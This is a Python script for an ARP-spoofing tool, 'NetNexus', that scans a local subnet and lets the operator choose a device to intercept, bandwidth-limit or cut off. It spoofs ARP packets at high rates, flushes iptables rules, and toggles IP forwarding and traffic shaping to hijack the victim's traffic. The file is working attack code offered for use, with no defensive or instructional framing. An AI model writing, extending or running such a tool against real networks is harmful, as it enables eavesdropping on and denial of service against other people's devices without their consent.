import scapy.all as scapy
import os, time, sys, subprocess, threading
from core import scanner, spoof

# Shared memory for the background scanner
device_memory = {}
stop_scanner = False

def set_forwarding(state):
    """Controls IP forwarding and aggressive firewall rules for Arch Linux."""
    if state:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
    else:
        # HARD KILL: Stop forwarding and drop all hijacked packets
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "DROP"], capture_output=True)

def background_scanner(ip_range):
    """Updates the device list every 0.5 seconds in the background."""
    global device_memory, stop_scanner
    while not stop_scanner:
        device_memory = scanner.scan(ip_range, device_memory)
        time.sleep(0.5)

def main():
    global device_memory, stop_scanner
    iface = "wlan0" # If your internet breaks, check if this is 'wlp...' using 'ip a'
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] Please run with sudo.")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"

    # Start the fast background scanner
    scan_thread = threading.Thread(target=background_scanner, args=(ip_range,), daemon=True)
    scan_thread.start()

    while True:
        print("\n" + "="*45)
        print("      NetNexus: 1000 Pkts/s Edition")
        print("="*45)
        
        current_list = list(device_memory.values())
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': 
            stop_scanner = True
            sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            print(f"\nTarget: {target['ip']} ({target['name']})")
            print("[1] Intercept | [2] Limit | [3] Kill")
            mode = input("Action: ").lower().strip()

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            
            # Optimized for 1000+ packets per second
            if mode in ["3", "kill"]:
                set_forwarding(False)
                wait_time = 0.001 
                print(f"[*] KILLED: {target['ip']} at maximum speed.")
            elif mode in ["1", "intercept"]:
                set_forwarding(True)
                wait_time = 0.5
                print(f"[*] INTERCEPTING: {target['ip']}")
            elif mode in ["2", "limit"]:
                kbps = input("Speed (kbps): ")
                set_forwarding(True)
                # Ensure you have 'tc' installed for this to work
                subprocess.run(["sudo", "tc", "qdisc", "add", "dev", iface, "root", "tbf", 
                                "rate", f"{kbps}kbps", "latency", "50ms", "burst", "1540"], capture_output=True)
                wait_time = 0.5
            else:
                print("[-] Invalid Action.")
                continue

            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time) 
                
        except (KeyboardInterrupt, Exception) as e:
            set_forwarding(True)
            subprocess.run(["sudo", "tc", "qdisc", "del", "dev", iface, "root"], capture_output=True)
            print(f"\n[*] Resetting... {e if not isinstance(e, KeyboardInterrupt) else ''}")
            break

if __name__ == "__main__":
    main()
